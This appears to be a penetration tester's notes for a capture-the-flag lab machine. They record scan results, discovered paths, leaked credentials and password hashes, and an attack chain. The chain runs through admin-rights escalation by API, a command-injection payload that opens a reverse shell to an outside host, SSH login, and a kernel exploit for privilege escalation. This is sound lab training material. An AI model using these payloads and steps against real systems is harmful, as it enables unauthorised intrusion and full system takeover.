| HOST         | PORT | PROTO | SERVICE | VERSION                 |
| ------------ | ---- | ----- | ------- | ----------------------- |
| 10.10.11.221 | 22   | tcp   | OpenSSH | 8.9p1 Ubuntu 3ubuntu0.1 |
| 10.10.11.221 | 80   | tcp   | nginx   |                         |


## HEADERS
---
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Mon, 10 Jul 2023 19:06:35 GMT
Content-Type: text/html
Content-Length: 162
Connection: keep-alive
Location: http://2million.htb/

---

## DIRECTORIES
---
* /login
* /register
* /logout               [--> /]
* /404
* /home                 [--> /]
* /api
* /invite
* /Database.php

---

## USERS
---
* admin SuperDuperPass123 (mysql)
* TRX `$2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq`
* TheCyberGeek `$2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK`

---

## NOTES
---
* `curl -X POST http://2million.htb/api/v1/invite/generate | jq .` to generate invite code, then decrypt b64
* `curl -s -q -H 'Cookie: PHPSESSID=89rv4g6hqp2arukuld37blggc5' 2million.htb/api/v1` returns route list
* `PUT /api/v1/admin/settings/update` with a json content-type, allows us to make ourselves admin to access other api routes 
```json
{"email": "wither@wither.wither", "is_admin": 1}
```
* `POST /api/v1/admin/vpn/generate` has a command injection vulnerability in 
```json
Content-Type: application/json
Content-Length: 88
{"username":"wither@wither.wither$(bash -c 'bash -i >& /dev/tcp/10.10.14.20/2222 0>&1')"}
```
* mysql pass in `.env` 
* ssh as admin
* `/var/mail/admin` says about OverlayFS CVE
* https://github.com/sxlmnwb/CVE-2023-0386
* `tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386` to zip
* `tar -xjvf CVE-2023-0386.tar.bz2` to unzip
---
